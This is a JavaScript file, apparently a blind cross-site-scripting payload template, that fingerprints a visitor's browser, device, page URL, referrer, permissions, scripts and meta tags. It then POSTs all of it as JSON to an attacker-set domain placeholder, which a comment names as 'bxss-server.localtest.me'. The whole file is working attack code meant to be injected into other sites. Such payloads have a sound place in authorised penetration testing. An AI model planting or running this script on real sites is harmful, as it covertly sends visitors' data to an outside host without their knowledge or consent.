function collectBrowserAndWebsiteInfo() {
    const info = {
      // Browser core information
      userAgent: navigator.userAgent,
      appName: navigator.appName,
      appVersion: navigator.appVersion,
      appCodeName: navigator.appCodeName,
      platform: navigator.platform,
      vendor: navigator.vendor,
      product: navigator.product,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      
      // Browser capabilities
      online: navigator.onLine,
      javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : 'Not available',
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      
      // Hardware information
      deviceMemory: navigator.deviceMemory,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      
      // Screen information
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenAvailWidth: window.screen.availWidth,
      screenAvailHeight: window.screen.availHeight,
      screenColorDepth: window.screen.colorDepth,
      screenPixelDepth: window.screen.pixelDepth,
      screenOrientation: window.screen.orientation ? window.screen.orientation.type : 'Not available',
      
      // Window information
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
      pageXOffset: window.pageXOffset,
      pageYOffset: window.pageYOffset,
      devicePixelRatio: window.devicePixelRatio,
      
      // Document information
      documentTitle: document.title,
      documentURL: document.URL,
      documentDomain: document.domain,
      documentReferrer: document.referrer,
      documentLastModified: document.lastModified,
      documentReadyState: document.readyState,
      documentCharacterSet: document.characterSet,
      documentContentType: document.contentType,
      documentDesignMode: document.designMode,
      documentChildren: document.children.length,
      
      // Location information
      locationHref: window.location.href,
      locationProtocol: window.location.protocol,
      locationHost: window.location.host,
      locationHostname: window.location.hostname,
      locationPort: window.location.port,
      locationPathname: window.location.pathname,
      locationSearch: window.location.search,
      locationHash: window.location.hash,
      locationOrigin: window.location.origin,
      
      // Time information
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneName: new Date().toLocaleDateString(undefined, {timeZoneName: 'long'}).split(',')[1],
      currentTime: new Date().toString(),
      
      // Feature detection
      features: {
        canvas: !!window.HTMLCanvasElement,
        webGL: (() => {
          try {
            return !!window.WebGLRenderingContext && !!document.createElement('canvas').getContext('webgl');
          } catch(e) {
            return false;
          }
        })(),
        audioAPI: typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined',
        videoAPI: !!document.createElement('video').canPlayType,
        clipboard: navigator.clipboard ? true : false,
        pointerEvents: window.PointerEvent ? true : false,
        touchEvents: 'ontouchstart' in window,
        webVR: navigator.getVRDisplays ? true : false,
        webXR: navigator.xr ? true : false
      },
      
      // Browser plugins
      plugins: Array.from(navigator.plugins || []).map(plugin => ({
        name: plugin.name,
        description: plugin.description,
        filename: plugin.filename
      })),
      
      // Supported MIME types
      mimeTypes: Array.from(navigator.mimeTypes || []).map(mimeType => ({
        type: mimeType.type,
        description: mimeType.description,
        suffixes: mimeType.suffixes
      }))
    };
  
    // Get permissions status if available
    if (navigator.permissions) {
      info.permissions = {};
      const permissionsToCheck = ['geolocation', 'notifications', 'push', 'midi', 'camera', 'microphone', 'background-sync', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
      
      permissionsToCheck.forEach(permission => {
        navigator.permissions.query({name: permission}).then(result => {
          info.permissions[permission] = result.state;
          console.log(`Permission ${permission} status:`, result.state);
        }).catch(() => {
          info.permissions[permission] = 'not supported';
        });
      });
    }
  
    // Detect browser name and version more precisely
    info.browserInfo = (function() {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      let version = 'Unknown';
      let matched;
      
      // Chrome
      if ((matched = ua.match(/(Chrome|Chromium)\/([0-9]+)\./))) {
        browser = matched[1];
        version = matched[2];
        
        // Edge (Chromium-based)
        if (ua.match(/Edg\//)) {
          browser = 'Edge';
          matched = ua.match(/Edg\/([0-9]+)/);
          if (matched) version = matched[1];
        }
        
        // Opera
        if (ua.match(/OPR\//)) {
          browser = 'Opera';
          matched = ua.match(/OPR\/([0-9]+)/);
          if (matched) version = matched[1];
        }
      }
      // Firefox
      else if ((matched = ua.match(/Firefox\/([0-9]+)\./))) {
        browser = 'Firefox';
        version = matched[1];
      }
      // Safari
      else if ((matched = ua.match(/Safari\/[0-9]+\./)) && (matched = ua.match(/Version\/([0-9]+)\./))) {
        browser = 'Safari';
        version = matched[1];
      }
      // IE
      else if ((matched = ua.match(/MSIE ([0-9]+)\./))) {
        browser = 'Internet Explorer';
        version = matched[1];
      }
      // IE 11
      else if ((matched = ua.match(/Trident\/.*rv:([0-9]+)\./))) {
        browser = 'Internet Explorer';
        version = matched[1];
      }
      
      return { name: browser, version: version };
    })();
  
    // Detect operating system
    info.osInfo = (function() {
      const ua = navigator.userAgent;
      let os = 'Unknown';
      let version = 'Unknown';
      
      if (ua.match(/Windows NT/)) {
        os = 'Windows';
        const ntVersions = {
          '10.0': '10',
          '6.3': '8.1',
          '6.2': '8',
          '6.1': '7',
          '6.0': 'Vista',
          '5.2': 'XP x64',
          '5.1': 'XP',
          '5.0': '2000'
        };
        const matched = ua.match(/Windows NT ([0-9.]+)/);
        if (matched && ntVersions[matched[1]]) {
          version = ntVersions[matched[1]];
        }
      } else if (ua.match(/Macintosh/)) {
        os = 'macOS';
        const matched = ua.match(/Mac OS X ([0-9_.]+)/);
        if (matched) {
          version = matched[1].replace(/_/g, '.');
        }
      } else if (ua.match(/Android/)) {
        os = 'Android';
        const matched = ua.match(/Android ([0-9.]+)/);
        if (matched) {
          version = matched[1];
        }
      } else if (ua.match(/iOS/)) {
        os = 'iOS';
        const matched = ua.match(/OS ([0-9_]+)/);
        if (matched) {
          version = matched[1].replace(/_/g, '.');
        }
      } else if (ua.match(/Linux/)) {
        os = 'Linux';
      } else if (ua.match(/CrOS/)) {
        os = 'Chrome OS';
      }
      
      return { name: os, version: version };
    })();
  
    // Detect if running in iframe
    info.isInIframe = window.self !== window.top;
    
    // Get current scripts on the page
    info.scripts = Array.from(document.scripts).map(script => ({
      src: script.src,
      type: script.type,
      async: script.async,
      defer: script.defer
    }));
    
    // Get meta tags
    info.metaTags = Array.from(document.getElementsByTagName('meta')).map(meta => ({
      name: meta.name,
      content: meta.content,
      httpEquiv: meta.httpEquiv,
      property: meta.getAttribute('property')
    }));
  
    console.log('Browser and Website Information:', info);
    return info;
  }
  
  // Call the function to collect information
  const browserInfo = collectBrowserAndWebsiteInfo();
  
  // To get the information as a JSON string
  const jsonString = JSON.stringify(browserInfo, null, 2);

  // Send the information to bxss-server.localtest.me
  fetch('//{{DOMAIN}}', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json'
      },
      body: jsonString
  })